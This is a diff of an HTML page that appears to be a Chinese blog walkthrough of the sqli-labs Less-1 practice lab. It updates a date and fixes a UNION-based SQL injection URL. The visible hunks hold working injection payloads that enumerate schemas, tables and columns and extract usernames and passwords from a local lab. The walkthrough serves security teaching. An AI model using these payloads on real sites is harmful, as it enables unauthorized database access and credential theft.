@@ -458,7 +458,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-20
+                    2020-11-21
                 </div>
                 
 
@@ -511,7 +511,7 @@ union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</c
 <p>2.爆security数据库的数据表</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+</code></pre><p><a href="https://imgchr.com/i/DQJ8C6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQJ8C6.png" alt="结果图"></a></p>
 <p>3.爆users表的列</p>
-<pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat() from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p>
 <p>4.爆数据</p>
 <pre><code>把id=2的username和password找出来
 http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,username,password from users where id=2 --+</code></pre><p>对应的sql语句是</p>
